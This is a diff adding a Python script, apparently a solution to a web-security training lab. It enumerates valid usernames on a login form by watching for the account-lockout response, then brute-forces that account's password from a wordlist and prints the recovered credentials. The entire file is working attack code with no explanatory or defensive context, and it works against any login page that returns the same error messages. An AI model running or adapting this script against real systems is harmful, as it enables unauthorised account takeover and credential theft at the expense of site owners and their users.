@@ -1,0 +1,64 @@
+import requests 
+import signal
+import sys
+import time
+import random
+
+
+def def_handler(sig, frame):
+
+    print(f'\n[!] Saliendo...\n\n')
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+url = "{Your-URL-Lab}/login"
+
+users = open("users")
+passwords = open("passwords")
+
+
+def enumusers(users, url):
+
+    username = ""
+
+    for user in users:
+        user = user.strip()
+        for i in range(1,5):
+            payload = {
+                'username': user,
+                'password': 'test'
+            }
+
+            r = requests.post(url, data=payload)
+
+            if 'Invalid username or password.' not in r.text: 
+                print(f"[+] El usuario es: {user}")
+                username = user
+                return username
+
+def enumpass(url, username, passwords):
+    
+    true_pass = ""
+
+    for password in passwords:
+
+        password = password.strip()
+        
+        payload = {
+            'username': username,
+            'password': password
+        }
+
+        r = requests.post(url, data=payload)
+
+
+        if 'You have made too many incorrect login attempts.' not in r.text and 'Invalid username or password.' not in r.text:
+            print(f"[+] Las credenciales son: {username}:{password}")
+            break
+
+
+if __name__ == '__main__':
+
+   username = enumusers(users, url)
+   enumpass(url, username, passwords)
